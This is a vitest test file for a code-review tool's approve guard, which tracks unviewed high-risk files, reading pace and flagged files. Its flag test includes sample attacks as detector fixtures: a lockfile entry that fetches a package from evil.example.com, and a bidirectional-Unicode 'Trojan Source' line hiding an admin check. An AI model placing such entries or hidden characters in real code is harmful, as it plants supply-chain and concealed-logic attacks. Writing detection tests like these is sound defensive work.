import { expect, test } from "vitest";
import type { FileViewFlags } from "../components/DiffViewer";
import { DEFAULT_PACE, MAX_LINES_PER_HOUR, SKIM_LINES_PER_HOUR, approveDoubts, approveGuard, fileFlags, flaggedDoubt, quickNote, quickRead, quickToast, riskiest, type GuardOptions, type QuickRead } from "./approve-guard";
import { defaultKnobs } from "./knobs";
import { changedLines } from "./review-size";
import type { Chapter } from "./workspace-context";

const MINUTE = 60_000;
/** A file's diff adding `n` lines, or the lines given. */
const added = (file: string, n: number, rows = Array.from({ length: n }, (_, i) => `line ${i}`)) => `diff --git a/${file} b/${file}\n--- a/${file}\n+++ b/${file}\n@@ -0,0 +1,${rows.length} @@\n${rows.map((row) => `+${row}`).join("\n")}\n`;
const patch = [added("src/auth.ts", 300), added("src/session.ts", 200), added("src/ui.ts", 400), added("package-lock.json", 900), added("README.md", 10)].join("");
const lines = changedLines(patch);
const chapter = (id: string, risk: Chapter["risk"], ...files: string[]): Chapter => ({ id, title: id, overview: "", risk, diffs: files.map((file) => ({ file })) });
const sections = [chapter("auth", "high", "src/auth.ts", "src/session.ts", "package-lock.json"), chapter("ui", "medium", "src/ui.ts"), chapter("docs", "low", "README.md")];
const viewed = (marks: Record<string, number>) => new Map<string, FileViewFlags>(Object.entries(marks).map(([file, viewedAt]) => [file, { viewed: true, stale: false, viewedAt }]));
const guard = (marks: Record<string, number>, views = viewed(marks)) => approveGuard(sections, views, patch, lines);

test("files in high-risk chapters not viewed are doubts, but not lockfiles, nor low- or medium-risk chapters", () => {
  expect(guard({}).unviewed).toEqual(["src/auth.ts", "src/session.ts"]);
  expect(guard({ "src/auth.ts": 0 }).unviewed).toEqual(["src/session.ts"]);
  // Viewed before its diff changed counts as not viewed.
  expect(guard({}, new Map([["src/auth.ts", { viewed: false, stale: true, viewedAt: 0 }], ["src/session.ts", { viewed: true, stale: false, viewedAt: 0 }]])).unviewed).toEqual(["src/auth.ts"]);
  expect(approveDoubts(guard({ "src/auth.ts": 0 }))).toEqual(["1 file in a high-risk chapter not viewed."]);
  expect(approveDoubts(guard({}))).toEqual(["2 files in high-risk chapters not viewed."]);
});

test("a file the change put at a path that reads as generated is a doubt unviewed, as any file to read", () => {
  const withVendor = [chapter("auth", "high", "src/auth.ts", "src/vendor/hook.ts")];
  const both = patch + added("src/vendor/hook.ts", 5);
  const marks = viewed({ "src/auth.ts": 0 });
  expect(approveGuard(withVendor, marks, both, changedLines(both)).unviewed).toEqual([]);
  expect(approveGuard(withVendor, marks, both, changedLines(both), { chosen: new Set(["src/vendor/hook.ts"]) }).unviewed).toEqual(["src/vendor/hook.ts"]);
});

test("a chapter is read from the mark before it to its last mark, and code over 500 lines an hour reads as read quickly, which Submit doesn't ask about", () => {
  // The docs, then auth's 500 lines in 30 minutes (1,000 an hour), then ui's 400 lines in 60 minutes.
  const marks = { "README.md": 0, "src/auth.ts": 20 * MINUTE, "src/session.ts": 30 * MINUTE, "src/ui.ts": 90 * MINUTE };
  expect(guard(marks).rushed).toEqual([{ id: "auth", number: 1, risk: "high", lines: 500, minutes: 30 }]);
  expect(approveDoubts(guard(marks))).toEqual([]);
  // Mark chapter viewed, at once, after an hour in it.
  expect(guard({ "README.md": 0, "src/auth.ts": 60 * MINUTE, "src/session.ts": 60 * MINUTE }).rushed).toEqual([]);
  // ...or as soon as the docs were done.
  expect(guard({ "README.md": 0, "src/auth.ts": 10_000, "src/session.ts": 10_000 }).rushed).toEqual([{ id: "auth", number: 1, risk: "high", lines: 500, minutes: 10_000 / MINUTE }]);
});

test("the review's first marks have no reading time to measure, so they don't count against it", () => {
  // auth.ts was read for as long as it took before anything else was marked; session.ts's 200 lines took 10 minutes.
  expect(guard({ "src/auth.ts": 0, "src/session.ts": 10 * MINUTE }).rushed).toEqual([{ id: "auth", number: 1, risk: "high", lines: 200, minutes: 10 }]);
  expect(guard({ "src/auth.ts": 0, "src/session.ts": 30 * MINUTE }).rushed).toEqual([]);
  expect(guard({ "src/auth.ts": 0, "src/session.ts": 0 }).rushed).toEqual([]);
  // Low-risk chapters and lockfiles are never judged on pace.
  expect(guard({ "src/auth.ts": 0, "package-lock.json": 1, "README.md": 2 }).rushed).toEqual([]);
});

test("a chapter is judged once every file to read in it is viewed, not while you're still in it", () => {
  // auth.ts in a minute, after the docs; session.ts not yet.
  expect(guard({ "README.md": 0, "src/auth.ts": MINUTE }).rushed).toEqual([]);
  expect(guard({ "README.md": 0, "src/auth.ts": MINUTE, "src/session.ts": 2 * MINUTE }).rushed.map((read) => read.id)).toEqual(["auth"]);
  // The lockfile it holds needn't be.
  expect(guard({ "README.md": 0, "src/auth.ts": MINUTE, "src/session.ts": 2 * MINUTE, "package-lock.json": 3 * MINUTE }).rushed.map((read) => read.id)).toEqual(["auth"]);
});

test("tests and docs read at their own paces, 2,000 lines an hour, and a chapter that takes under 6 minutes isn't judged", () => {
  const files = [added("src/api.ts", 100), added("src/api_test.go", 400), added("docs/api.md", 300), added("src/db_test.go", 67)].join("");
  const mixed = [chapter("before", "low", "src/api.ts"), chapter("api", "medium", "src/api_test.go", "docs/api.md"), chapter("tests", "medium", "src/db_test.go")];
  const at = (marks: Record<string, number>, options?: GuardOptions) => approveGuard(mixed, viewed(marks), files, changedLines(files), options).rushed;
  // 400 lines of tests and 300 of docs take 21 minutes at 2,000 an hour: 20 minutes is quick, 25 isn't.
  expect(at({ "src/api.ts": 0, "src/api_test.go": 20 * MINUTE, "docs/api.md": 20 * MINUTE })).toEqual([{ id: "api", number: 2, risk: "medium", lines: 700, minutes: 20 }]);
  expect(at({ "src/api.ts": 0, "src/api_test.go": 25 * MINUTE, "docs/api.md": 25 * MINUTE })).toEqual([]);
  // As code, the same lines would take 84 minutes.
  expect(at({ "src/api.ts": 0, "src/api_test.go": 25 * MINUTE, "docs/api.md": 25 * MINUTE }, { pace: { ...DEFAULT_PACE, tests: 500, docs: 500 } }).map((read) => read.id)).toEqual(["api"]);
  // 67 lines of tests take 2 minutes: marked in under one, it isn't judged.
  expect(at({ "src/api.ts": 0, "src/db_test.go": 30_000 })).toEqual([]);
  expect(defaultKnobs.approveGuardTestsPace).toBe(SKIM_LINES_PER_HOUR);
  expect(defaultKnobs.approveGuardDocsPace).toBe(SKIM_LINES_PER_HOUR);
});

test("Settings' code pace sets how fast its chapters can be read, 500 lines an hour by default", () => {
  // auth's 500 lines in 37.5 minutes: 800 an hour.
  const marks = { "README.md": 0, "src/auth.ts": 20 * MINUTE, "src/session.ts": 37.5 * MINUTE };
  expect(guard(marks).rushed.map((read) => read.id)).toEqual(["auth"]);
  expect(approveGuard(sections, viewed(marks), patch, lines, { pace: { ...DEFAULT_PACE, code: 1000 } }).rushed).toEqual([]);
  expect(approveGuard(sections, viewed(marks), patch, lines, { pace: { ...DEFAULT_PACE, code: 700 } }).rushed.map((read) => read.id)).toEqual(["auth"]);
  expect(defaultKnobs.approveGuardPace).toBe(MAX_LINES_PER_HOUR);
});

test("the time a chapter showed counts when it's longer than its marks say, and never makes a quick read of one", () => {
  const marks = { "README.md": 0, "src/auth.ts": 20 * MINUTE, "src/session.ts": 30 * MINUTE };
  const at = (opened: Record<string, number>, marked: Record<string, number> = marks) => approveGuard(sections, viewed(marked), patch, lines, { opened: new Map(Object.entries(opened)) }).rushed;
  // Read for an hour before Mark viewed: not quick, whatever the marks say.
  expect(at({ auth: 60 * MINUTE })).toEqual([]);
  // 50 minutes of the 60 its 500 lines take: quick, in the longer of the two.
  expect(at({ auth: 50 * MINUTE })).toEqual([{ id: "auth", number: 1, risk: "high", lines: 500, minutes: 50 }]);
  expect(at({ auth: 10 * MINUTE })).toEqual([{ id: "auth", number: 1, risk: "high", lines: 500, minutes: 30 }]);
  // The review's first chapter, marked at once, still isn't judged, however briefly it showed.
  expect(at({ auth: 1_000 }, { "src/auth.ts": 0, "src/session.ts": 0 })).toEqual([]);
});

test("It's fine takes a chapter's quick read off the list until it's marked again", () => {
  const marks = { "README.md": 0, "src/auth.ts": 20 * MINUTE, "src/session.ts": 30 * MINUTE };
  const at = (fine: number, marked = marks) => approveGuard(sections, viewed(marked), patch, lines, { fine: new Map([["auth", fine]]) }).rushed;
  expect(at(31 * MINUTE)).toEqual([]);
  expect(at(30 * MINUTE)).toEqual([]);
  // Said before its last mark: a new read, and a new quick one.
  expect(at(29 * MINUTE).map((read) => read.id)).toEqual(["auth"]);
  expect(at(31 * MINUTE, { ...marks, "src/session.ts": 32 * MINUTE }).map((read) => read.id)).toEqual(["auth"]);
});

test("flagged files not viewed are doubts, in reading order, as their headers flag them and Settings shows those", () => {
  const weak = 'diff --git a/src/auth.test.ts b/src/auth.test.ts\n--- a/src/auth.test.ts\n+++ b/src/auth.test.ts\n@@ -1,2 +1,1 @@\n it("logs in", () => {\n-  expect(login()).toBe(true);\n';
  const lockfile = 'diff --git a/package-lock.json b/package-lock.json\n--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1,1 +1,4 @@\n {\n+    "node_modules/tiny": {\n+      "resolved": "https://evil.example.com/tiny-1.0.0.tgz",\n+    },\n';
  const bidi = added("src/admin.ts", 0, ["const isAdmin = false; /*\u202E } if (isAdmin) { \u2066*/"]);
  const files = [weak, lockfile, bidi, added("src/plain.ts", 3)].join("");
  expect(fileFlags(files)).toEqual(new Map([["src/auth.test.ts", ["weakened"]], ["package-lock.json", ["host"]], ["src/admin.ts", ["bidi"]]]));
  expect(fileFlags(files, { weakTests: false, lockfiles: false })).toEqual(new Map([["src/admin.ts", ["bidi"]]]));
  const order = [chapter("a", "low", "src/admin.ts", "src/plain.ts"), chapter("b", "low", "package-lock.json", "src/auth.test.ts")];
  const flagged = (marks: Record<string, number>) => approveGuard(order, viewed(marks), files, changedLines(files), { flags: fileFlags(files) });
  expect(flagged({}).flagged).toEqual([{ file: "src/admin.ts", flags: ["bidi"] }, { file: "package-lock.json", flags: ["host"] }, { file: "src/auth.test.ts", flags: ["weakened"] }]);
  expect(approveDoubts(flagged({}))).toEqual(["3 flagged files not viewed: tests weakened, a new download host, hidden Unicode."]);
  expect(approveDoubts(flagged({ "src/admin.ts": 0, "package-lock.json": 0 }))).toEqual(["1 flagged file not viewed: tests weakened."]);
  expect(flagged({ "src/admin.ts": 0, "package-lock.json": 0, "src/auth.test.ts": 0 }).flagged).toEqual([]);
  expect(flaggedDoubt([{ file: "a", flags: ["bidi", "weakened"] }])).toBe("1 flagged file not viewed: tests weakened, hidden Unicode.");
});

test("a quick read says what it was, on its chapter, in Finish review, and as you mark it viewed", () => {
  const read = (over: Partial<QuickRead>): QuickRead => ({ id: "c", number: 3, risk: "high", lines: 237, minutes: 1.2, ...over });
  expect(quickNote(read({}))).toBe("Read quickly · 237 lines in 1 min");
  expect(quickNote(read({ lines: 24_196, minutes: 0.5 }))).toBe("Read quickly · 24,196 lines in under a minute");
  expect(quickRead([read({})])).toBe("Read quickly: chapter 3 · 237 lines in 1 min");
  expect(quickRead([read({ number: 2, risk: "medium", lines: 136, minutes: 0.4 }), read({ minutes: 0.5 })])).toBe("Read quickly: chapters 2 and 3 · 373 lines in under a minute");
  expect(quickRead([read({ number: 2 }), read({}), read({ number: 5, minutes: 3 })])).toBe("Read quickly: chapters 2, 3 and 5 · 711 lines in 5 min");
  expect(quickToast([read({})])).toBe("Chapter 3 went quickly for high risk.");
  expect(quickToast([read({ number: 2 }), read({})])).toBe("Chapters 2 and 3 went quickly for their risk.");
  // Back to it, and Finish review's Show, go to the highest risk, then the most lines.
  expect(riskiest([read({ id: "m", risk: "medium", lines: 900 }), read({ id: "h1", lines: 100 }), read({ id: "h2", lines: 200 })]).id).toBe("h2");
});
